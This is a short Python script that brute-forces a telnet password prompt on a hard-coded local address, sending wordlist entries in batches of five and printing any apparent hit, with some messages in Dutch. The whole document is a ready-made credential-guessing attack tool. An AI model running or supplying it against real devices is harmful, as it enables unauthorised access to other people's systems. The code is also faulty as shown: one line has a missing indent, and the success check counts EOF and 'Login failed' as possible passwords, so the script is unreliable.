#!/usr/bin/env python3
import pexpect
import sys
import time

HOST = "192.168.1.4"
PORT = "23"
TIMEOUT = 5

def try_password_batch(passwords):
    for pwd in passwords:
        pwd = pwd.strip()
        if not pwd:
            continue
        try:
            print(f"[+] Trying {pwd}")
            child = pexpect.spawn(f'telnet {HOST} {PORT}', timeout=TIMEOUT)
            child.expect("Please enter Password:") 
            child.sendline(pwd)
            index = child.expect([pexpect.EOF, "Incorrect", ">", "#", "\$", "Login failed"], timeout=3)

            if index != 1:
                print(f"[!] mogelijk wachtwoord: '{pwd}'")
                print(child.before.decode('utf-8', errors='ignore'))
                child.close()
                return
            child.close()
            time.sleep(1)
        except Exception as e:
            print(f"[-] Error with '{pwd}': {e}")
            continue

    print("[*] wachtwoorden getest op naar de volgende\n")
    time.sleep(2)

def main(wordlist_file):
    try:
        with open(wordlist_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[-] error in wordlist: {e}")
        sys.exit(1)

    for i in range(0, len(passwords), 5):
        batch = passwords[i:i+5]
        print(f"[*] Trying batch: {batch}")
        try_password_batch(batch)

if __name__ == "__main__":
    if len(sys.argv) != 2:
    sys.exit(1)
    main(sys.argv[1])

